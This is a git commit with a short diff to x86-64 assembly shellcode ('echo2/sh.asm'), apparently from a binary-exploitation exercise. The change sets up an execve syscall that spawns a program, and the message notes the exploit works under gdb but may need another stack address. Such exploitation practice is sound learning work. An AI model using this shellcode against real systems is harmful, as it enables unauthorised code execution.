d72d359bfd6eabf17271b96f11efdfd47ba985b6
Kestrel280 <downey.samp@gmail.com>
2025-05-25 22:29:25 -0400

    echo2 so close, works in gdb, maybe need different stack address for non-debug?

--- echo2/sh.asm
+++ echo2/sh.asm
@@ -7,6 +7,6 @@ _start:
     mov     rax, 0x3b           ; execve()
     mov     rdi, 0x6020a0       ; arg0 (filename) -- stored in 'id'
     xor     rsi, rsi            ; arg1 (argv)
-    ; xor     rdx, rdx            ; arg2 (envp)
+    xor     rdx, rdx            ; arg2 (envp)
     syscall
 
